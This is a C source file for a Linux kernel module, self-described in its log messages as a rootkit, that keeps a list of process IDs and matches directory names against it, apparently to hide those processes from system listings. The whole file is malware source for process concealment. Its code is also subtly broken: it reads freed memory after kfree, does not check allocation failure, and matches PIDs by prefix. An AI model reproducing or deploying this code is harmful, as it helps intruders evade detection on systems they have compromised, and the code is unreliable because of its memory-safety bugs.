#include <linux/slab.h>
#include <linux/string.h>

#include "pid.h"

// FIXME: Free remaining list

struct pid_node {
  char pid[NAME_MAX];
  struct list_head list;
};

LIST_HEAD(hidden_pids);

static void unhide_pid(struct pid_node* pid)
{
  list_del(&pid->list);
  kfree(pid);
  printk(KERN_DEBUG "rootkit: Unhid PID %s\n", pid->pid);
}

void hide_pid(pid_t pid)
{
  struct pid_node* hidden_pid;
  struct list_head *curr, *node;
  struct pid_node* curr_pid;

  // Check if already hidden - unhide if so
  list_for_each_safe(curr, node, &hidden_pids)
  {
    char pid_str[NAME_MAX];
    sprintf(pid_str, "%d", pid);
    curr_pid = list_entry(curr, struct pid_node, list);
    if (strcmp(curr_pid->pid, pid_str) == 0) {
      unhide_pid(curr_pid);
      return;
    }
  }

  hidden_pid = kmalloc(sizeof(struct pid_node), GFP_KERNEL);
  // struct list_head* curr;
  // struct pid_node* curr_pid;

  sprintf(hidden_pid->pid, "%d", pid);
  INIT_LIST_HEAD(&hidden_pid->list);
  list_add(&hidden_pid->list, &hidden_pids);

  printk(KERN_DEBUG "rootkit: Hid PID %d\n", pid);
}

int pid_match(const char* d_name)
{
  struct list_head* curr;
  struct pid_node* curr_pid;
  int res = 0;

  list_for_each(curr, &hidden_pids)
  {
    curr_pid = list_entry(curr, struct pid_node, list);
    res |= (memcmp(curr_pid->pid, d_name, strlen(curr_pid->pid)) == 0) &&
           (strncmp(curr_pid->pid, "", NAME_MAX) != 0);
    if (/* found early return since not O(1) */ res)
      return res;
  }

  return res;
}
